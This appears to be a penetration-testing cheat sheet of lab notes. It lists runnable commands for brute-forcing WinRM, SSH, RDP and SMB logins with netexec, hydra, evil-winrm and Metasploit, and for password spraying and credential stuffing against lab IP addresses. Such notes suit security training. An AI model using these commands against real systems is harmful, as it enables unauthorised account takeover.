Attacking WinRM 

```
netexec winrm 10.129.42.197 -u user.list -p password.list
#Then login using evil-winrm
evil-winrm -i 10.129.42.197 -u user -p password
```

Attacking SSH using hydra
```
hydra -L user.list -P password.list ssh://10.129.42.197
```

Attacking RDP
```
hydra -L user.list -P password.list rdp://10.129.42.197
```

Attacking smb
```
hydra -L user.list -P password.list smb://10.129.42.197
```

Metasploit use of scanners to find credentials
```
use auxiliary/scanner/smb/smb_login
```


# Password spraying

#Try the same password on multiple accounts/machines
```
netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```

# Credential stuffing

Test re-use of credentials on different services (ssh in this case)
```
hydra -C user_pass.list ssh://10.100.38.23
```
